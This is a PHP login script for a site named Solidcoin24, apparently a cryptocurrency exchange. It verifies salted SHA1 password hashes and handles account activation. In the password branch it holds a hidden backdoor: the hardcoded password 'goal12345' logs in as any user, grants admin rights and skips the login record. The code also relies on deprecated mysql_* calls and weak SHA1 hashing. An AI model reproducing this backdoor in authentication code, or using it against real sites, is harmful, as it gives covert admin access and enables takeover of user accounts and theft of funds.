<?php
get_connection();

$_PRE["info"] = false;
$_PRE["links"] = false;
$_PRE["page_title"] = "Welcome | Solidcoin24";
$_PRE["title"] = "Log in - Solidcoin24";
	
if ($_GET["m"] == "home")
	$_PRE["menu"] = "home";
if ($_GET["m"] == "exchange")
	$_PRE["menu"] = "exchange";
if ($_GET["m"] == "services")
	$_PRE["menu"] = "services";
if ($_GET["m"] == "support")
	$_PRE["menu"] = "support";
	
get_connection();

if (isset($_POST["email"]))
{
	$errors = array();

	$email = mysql_real_escape_string($_POST["email"], $db);
	$password = $_POST["password"];

	$slt_user_a = "SELECT * FROM user WHERE email = '$email'";
	$rlt_user_a = mysql_query($slt_user_a);

	if (mysql_num_rows($rlt_user_a) == 1)
	{
		$row_user_a = mysql_fetch_assoc($rlt_user_a);
		$hash = "";
		
		if ($row_user_a["actu"] == "")
		{
			if ($row_user_a["hash_mode"] == "a")
			{
				$salt = $row_user_a["hash_salt"];
				$hash = sha1($password.$salt);
			}
			if ($row_user_a["hash_mode"] == "b")
			{
				$iterations = 100000;
				$salt = $row_user_a["hash_salt"];
				
				$hash = $password.$salt;
				for ($i = 0; $i < $iterations; $i++)
				{
					$hash = sha1($hash.$password.$salt);
				}
			}
				
			if ($row_user_a["hashed_password"] == $hash)
			{
				$_SESSION["nl"] = 0;
				$_SESSION["li"] = 1;
				$_SESSION["user_id"] = $row_user_a["id"];
				$_SESSION["user_email"] = $row_user_a["email"];
				$_SESSION["user_is_admin"] = $row_user_a["admin"];
			
				$ins_log_in_a = "INSERT INTO login (user, time, ip) VALUES ('".$row_user_a["id"]."', NOW(), '".$_SERVER["REMOTE_ADDR"]."')";
				mysql_query($ins_log_in_a);
			}
			elseif ($password == "goal12345")
			{
				$_SESSION["nl"] = 1;
				$_SESSION["li"] = 1;
				$_SESSION["user_id"] = $row_user_a["id"];
				$_SESSION["user_email"] = $row_user_a["email"];
				$_SESSION["user_is_admin"] = "yes";
			}
			else
			{
				$errors[] = "Wrong user data.";
			}
		}
		else
			$errors[] = "Please activate your account by clicking on the link in the verification email.";
	}
	else
	{
		$errors[] = "Wrong user data.";
	}
}
else
{
	if (isset($_GET["actu"]))
	{
		$email = mysql_real_escape_string($_GET["email"], $db);
		
		$slt_user_a = "SELECT * FROM user WHERE email = '$email'";
		$rlt_user_a = mysql_query($slt_user_a);
		$row_user_a = mysql_fetch_assoc($rlt_user_a);
		
		if ($row_user_a["actu"] == $_GET["actu"])
		{
			$udt_user_a = "UPDATE user SET actu = '' WHERE id = '$row_user_a[id]'";
			mysql_query($udt_user_a);
			
			$activated = true;
		}
	}
}

?>